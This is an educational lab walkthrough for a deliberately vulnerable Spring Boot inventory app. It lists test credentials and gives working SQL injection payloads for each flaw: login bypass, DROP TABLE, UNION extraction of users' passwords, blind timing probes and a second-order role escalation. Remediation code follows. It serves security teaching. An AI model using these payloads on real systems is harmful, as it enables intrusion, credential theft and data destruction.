Educational Lab: This application contains intentional SQL injection vulnerabilities. Use ONLY in isolated training environments. Do NOT deploy to production.
Lab Overview

Application: SecureShop Inventory Management (Java Spring Boot)

Target URL: http://localhost:8080

Database: H2 In-Memory (accessible at /h2-console)

Test Credentials:

  • admin / admin123 — Admin role
  • john / password123 — User role
  • jane / secret — User role
  • manager / manager2024 — Manager role

Vulnerabilities:

  • SQL-001: Authentication bypass (login form)
  • SQL-002: Error-based SQL injection (product search)
  • SQL-003: Blind SQL injection (inventory report date range)
  • SQL-004: UNION-based injection (supplier lookup)
  • SQL-005: Second-order injection (inventory adjust notes)
Step 1: Reconnaissance & Attack Surface Mapping

Identify all endpoints that accept user input and interact with the database:

Input Points to Map:
  • POST /auth/login — username, password parameters
  • POST /auth/register — username, email, password
  • POST /auth/reset-password — username, email
  • GET /products/search — q, category parameters
  • GET /inventory/report — startDate, endDate, transactionType
  • GET /suppliers/search — q parameter
  • POST /inventory/adjust — notes parameter (second-order)

Also check exposed attack surface:

  • /h2-console — Direct DB access
  • /actuator/env — Environment variables (hardcoded secrets!)
  • /actuator/mappings — All URL mappings

Step 3: Vulnerability Discovery & Exploitation
SQL-001: Authentication Bypass

Go to /auth/login. Enter in Username field:

admin' OR '1'='1' --

Any password will work. The generated SQL becomes:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '...'

SQL-002: Error-Based Injection (Product Search)

Go to /products/search. Try in the search box:

' OR 1=1 --
'; DROP TABLE products --

To extract user data using UNION injection:

' UNION SELECT id,username,password,email,role,quantity,supplier_id,created_at FROM users --
SQL-003: Blind SQL Injection (Inventory Report)

Go to /inventory/report. Test with time-based blind injection in Start Date:

2020-01-01' AND SLEEP(3) --

If the response takes 3+ seconds → SQL injection confirmed. Boolean-based:

2020-01-01' AND 1=1 --    (returns results = TRUE)
2020-01-01' AND 1=2 --    (returns no results = FALSE)
SQL-004: UNION Injection (Supplier Search)

Go to /suppliers/search:

' UNION SELECT id,username,password,email,role,enabled,last_login FROM users --

This returns user records in the supplier table output, exposing all credentials.

SQL-005: Second-Order Injection (Inventory Adjust)

Go to Inventory. In the Notes field enter:

test'); UPDATE users SET role='ADMIN' WHERE username='john'; --
Step 4: Impact Assessment
  • Data breach: All user credentials (plaintext passwords!) exfiltrated
  • Authentication bypass: Attacker can log in as any user including admin
  • Privilege escalation: Regular user → Admin via role UPDATE
  • Data destruction: DROP TABLE possible (depends on DB user permissions)
  • Business impact: Complete system compromise, regulatory violations (GDPR/PCI-DSS)
Step 5: Remediation — How to Fix
1. Use Parameterized Queries (PreparedStatement)
// VULNERABLE:
String sql = "SELECT * FROM users WHERE username = '" + username + "'";

// SECURE:
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);

// Or with JdbcTemplate:
String sql = "SELECT * FROM users WHERE username = ?";
jdbcTemplate.queryForList(sql, username);
2. Hash Passwords (BCrypt)
// Use Spring Security's PasswordEncoder
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
String hashedPassword = encoder.encode(rawPassword);
// Verify: encoder.matches(rawPassword, storedHash)
3. Apply Least Privilege Database User
-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON inventory_db.products TO 'app_user'@'localhost';
-- Do NOT grant DROP, CREATE, or access to other tables
4. Validate and Sanitize Input
// Validate date format before use
if (!startDate.matches("\\d{4}-\\d{2}-\\d{2}")) {
    throw new IllegalArgumentException("Invalid date format");
}
